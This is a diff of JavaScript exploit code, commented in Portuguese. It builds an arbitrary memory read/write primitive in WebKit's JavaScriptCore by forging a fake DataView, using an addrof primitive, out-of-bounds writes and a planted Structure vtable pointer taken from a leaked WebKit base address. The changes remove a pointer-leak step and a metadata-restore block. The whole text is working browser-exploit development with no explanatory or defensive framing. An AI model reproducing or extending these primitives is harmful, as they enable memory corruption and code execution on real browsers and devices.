@@ -47,15 +47,17 @@ let _fake_data_view = null;
  * @param {AdvancedInt64} dataViewStructureVtableAddress O endereço do vtable da DataView Structure.
  * @returns {boolean} True se a primitiva foi configurada com sucesso.
  */
-async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureVtableAddress) { // Adicionado dataViewStructureVtableAddress
+async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureVtableAddress) { // Removido o argumento de vazamento da Structure* real, agora aceita o endereço do vtable
     const FNAME = "setupUniversalArbitraryReadWrite";
     logFn(`[${FNAME}] Iniciando configuração da primitiva de L/E Arbitrária Universal via fake DataView...`, "subtest", FNAME);
 
-    // Variáveis para armazenar snapshots de metadados do DataView OOB para restauração
-    let m_vector_orig_snap_oob, m_length_orig_snap_oob, m_mode_orig_snap_oob;
     let success = false; // Flag para controlar o fluxo de saída
 
     try {
+        // --- REMOVIDO: Bloco de vazamento da Structure* de um DataView real.
+        // Já vazamos o webkit_base_address, e temos o offset estático do vtable da Structure.
+        // Usaremos esse valor diretamente para plantar.
+
         // 1. Criar um objeto JavaScript simples que servirá como o "corpo" do nosso DataView forjado.
         const fake_dv_backing_object = {
             prop_0x00_placeholder_for_structure_ptr: new AdvancedInt64(0,0), // A Structure* fica no offset 0 do objeto JSCell
@@ -75,6 +77,7 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
         // O offset 0x8 é para o ponteiro da Structure* dentro do JSCell.
         // O VTable da Structure* é o próprio endereço da Structure*.
         // Portanto, o dataViewStructureVtableAddress é o que precisamos plantar aqui.
+        // Usamos a primitiva arb_write (a OLD, que funciona no buffer OOB) para escrever no backing object.
         await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureVtableAddress, 8);
         logFn(`[${FNAME}] Ponteiro da Structure* (${dataViewStructureVtableAddress.toString(true)}) plantado no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do objeto de apoio.`, "info", FNAME);
 
@@ -138,22 +141,9 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
         logFn(`ERRO CRÍTICO na configuração da L/E Universal: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
         return false;
     } finally {
-        // Restore m_vector of oob_dataview_real back to its original value here
-        // regardless of success or failure of the phase.
-        // Check if oob_dataview_real and snapshots are defined to avoid ReferenceError.
-        if (getOOBDataView() && typeof m_vector_orig_snap_oob !== 'undefined' && typeof m_length_orig_snap_oob !== 'undefined' && typeof m_mode_orig_snap_oob !== 'undefined') {
-            try {
-                // The 0x58 (OOB_DV_METADATA_BASE_IN_OOB_BUFFER) offsets are assumed as the base of the DataView metadata in the OOB buffer.
-                oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET, m_vector_orig_snap_oob, 8);
-                oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, m_length_orig_snap_oob, 4);
-                oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET, m_mode_orig_snap_oob, 4);
-                logFn(`[${FNAME}] DEBUG: Metadados do oob_dataview_real restaurados.`, "debug", FNAME);
-            } catch (e_restore) {
-                logFn(`[${FNAME}] ERRO ao restaurar metadados do oob_dataview_real: ${e_restore.message}. Ambiente pode estar instável.`, "error", FNAME);
-            }
-        } else {
-            logFn(`[${FNAME}] ALERTA: Não foi possível restaurar metadados do oob_dataview_real. Ambiente OOB pode estar comprometido ou não inicializado.`, "warn", FNAME);
-        }
+        // Nada para restaurar aqui em termos de oob_dataview_real m_vector,
+        // pois não o manipulamos dentro desta função para o vazamento de Structure*.
+        // A restauração já ocorre no executeTypedArrayVictimAddrofAndWebKitLeak_R43.
         logFn(`--- Configuração da L/E Universal Concluída ---`, "test", FNAME);
     }
 }
@@ -168,7 +158,7 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
         throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
     }
     // Redirecionar o m_vector do DataView forjado para o endereço desejado
-    const fake_dv_backing_object_addr = addrof_core(_fake_data_view); // Endereço do objeto que serve de corpo para o _fake_data_view
+    const fake_dv_backing_object_addr = addrof_core(_fake_data_view);
     const M_VECTOR_OFFSET_IN_BACKING_OBJECT = fake_dv_backing_object_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
 
     await arb_write(M_VECTOR_OFFSET_IN_BACKING_OBJECT, address, 8); // Manipula o corpo do fake DataView para apontar para 'address'
